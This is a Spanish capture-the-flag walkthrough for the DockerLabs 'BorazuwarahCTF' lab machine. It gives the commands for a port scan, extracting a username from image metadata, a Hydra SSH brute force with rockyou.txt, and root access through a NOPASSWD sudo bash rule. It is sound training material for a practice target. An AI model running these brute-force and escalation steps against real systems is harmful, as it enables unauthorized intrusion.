# Write-up: BorazuwarahCTF (DockerLabs)

Esta guía detalla la resolución de la máquina "BorazuwarahCTF" de la plataforma DockerLabs, clasificada como de dificultad "Muy Fácil".

## 1. Reconocimiento e Identificación (Reconnaissance)
Comenzamos identificando el estado de la máquina y sus puertos abiertos. La dirección IP objetivo es `172.17.0.2`.

### Escaneo de Puertos (Nmap)
```bash
nmap -sC -sV -p- 172.17.0.2
```
Resultado destacado:
*   **22/tcp**: SSH (OpenSSH 9.2p1)
*   **80/tcp**: HTTP (Apache 2.4.59)

## 2. Enumeración Web y Extracción de Datos
Al acceder al servicio web por el puerto 80, encontramos una página simple que carga una imagen: `imagen.jpeg`.

### Análisis de Metadatos (Exiftool)
Descargamos la imagen o la analizamos directamente. Al revisar sus metadatos, encontramos información crítica:
```bash
exiftool imagen.jpeg
```
**Resultado relevante:**
`Description: ---------- User: borazuwarah ----------`

Hemos identificado un nombre de usuario potencial: **borazuwarah**.

## 3. Acceso Inicial (Exploitation)
Dado que tenemos un usuario y el puerto SSH abierto, procedemos a realizar un ataque de fuerza bruta con `Hydra` y el diccionario `rockyou.txt`.

### Ataque SSH con Hydra
```bash
hydra -l borazuwarah -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2
```
**Credenciales encontradas:**
`borazuwarah : 123456`

Accedemos al sistema:
```bash
ssh borazuwarah@172.17.0.2
```

## 4. Escalada de Privilegios (Privilege Escalation)
Una vez dentro como el usuario `borazuwarah`, revisamos nuestros privilegios de `sudo`.

### Enumeración de Sudo
```bash
sudo -l
```
**Resultado:**
```
(ALL) NOPASSWD: /bin/bash
```

Esto nos indica que podemos ejecutar `/bin/bash` con permisos de root sin necesidad de contraseña.

### Obtención de Root
Simplemente ejecutamos:
```bash
sudo bash
```
¡Ya somos root!

## 5. Conclusión
La máquina es un excelente ejercicio introductorio. Los puntos clave fueron la enumeración de metadatos en archivos multimedia y la revisión de configuraciones de sudo inseguras.

---
*Write-up creado por Antigravity.*
